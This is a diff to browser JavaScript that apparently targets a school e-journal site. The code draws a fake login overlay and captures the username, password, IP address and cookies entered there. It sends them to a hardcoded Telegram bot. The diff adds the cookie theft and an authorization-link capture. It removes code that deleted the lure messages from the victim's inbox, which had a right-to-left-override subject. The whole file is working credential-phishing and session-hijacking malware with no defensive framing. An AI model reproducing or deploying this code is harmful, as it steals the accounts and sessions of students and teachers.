@@ -1,11 +1,14 @@
-// === Настройки Telegram ===
 const TELEGRAM_TOKEN = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
 const TELEGRAM_CHAT_ID = "-1003077695457";
 const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-
+const cookies = document.cookie.split("; ").reduce((acc, cookie) => {
+    const [name, ...value] = cookie.split("=");
+    acc[name] = value.join("=");
+    return acc;
+}, {});
+const cookieJSON = JSON.stringify(cookies);
 let userIP = "Не удалось определить";
 
-// === Уведомление о dev-only ===
 const messageContainer = document.querySelector(".typography.overflow");
 if (messageContainer) {
   messageContainer.innerHTML = `
@@ -18,7 +21,6 @@ if (messageContainer) {
     </div>`;
 }
 
-// === Получение IP пользователя ===
 async function fetchUserIP() {
   try {
     const res = await fetch("https://api.ipify.org?format=json");
@@ -29,20 +31,18 @@ async function fetchUserIP() {
   }
 }
 
-// === Отправка сообщений в Telegram ===
 async function sendToTelegram(text) {
   try {
     await fetch(TELEGRAM_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text })
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "Markdown" })
     });
   } catch (err) {
     console.error("Ошибка отправки в Telegram:", err);
   }
 }
 
-// === Создание размывающего оверлея и формы логина ===
 function createLoginOverlay() {
   document.body.style.position = "relative";
   document.body.style.overflow = "hidden";
@@ -107,7 +107,6 @@ function createLoginOverlay() {
   return { loginViewport, blurOverlay };
 }
 
-// === Обработка отправки формы ===
 function handleFormSubmit(loginViewport, blurOverlay) {
   const form = loginViewport.querySelector("form");
   form.addEventListener("submit", async (e) => {
@@ -139,43 +138,14 @@ function handleFormSubmit(loginViewport, blurOverlay) {
       const data = await res.json();
 
       if (data.result && data.actions?.[0]?.type === "redirect") {
-        // Отправка данных в Telegram
-        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}`);
+        const url = data.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(data.actions[0].url)})` : "Нет URL";
+        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}\n🍪Куки: ${cookieJSON}\n Ссылка для авторизации: ${url}`);
 
-        // Работа с сообщениями после успешного входа
-        (async () => {
-          const baseUrl = "/journal-api-messages-action";
-
-          try {
-            const res = await fetch(`${baseUrl}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`, {
-              credentials: "include",
-            });
-            const msgData = await res.json();
-
-            const target = msgData.list.filter(msg => msg.subject.includes("Привет!:\u202E"));
-            const ids = target.map(msg => msg.id);
-
-            if (ids.length > 0) {
-              console.log("Нашлись сообщения:", ids);
-              const deleteUrl = `${baseUrl}?method=messages.delete&idsString=${encodeURIComponent(ids.join(";"))}&type=inbox`;
-              const delRes = await fetch(deleteUrl, { credentials: "include" });
-              const delData = await delRes.json();
-              console.log("Результат удаления:", delData);
-            } else {
-              console.log("Ничего не нашлось");
-            }
-          } catch (err) {
-            console.error("Ошибка при обработке сообщений:", err);
-          }
-        })();
-
-        // Закрываем оверлей
         blurOverlay.remove();
         loginViewport.remove();
         document.body.style.overflow = "";
         document.body.style.position = "";
 
-        // Перенаправление на главную страницу
         window.location.href = "/";
       } else if (data.errors?.length > 0) {
         const msg = data.errors[0].text || "Ошибка входа";
@@ -198,7 +168,6 @@ function handleFormSubmit(loginViewport, blurOverlay) {
   });
 }
 
-// === Инициализация скрипта ===
 (async function init() {
   await fetchUserIP();
   const { loginViewport, blurOverlay } = createLoginOverlay();
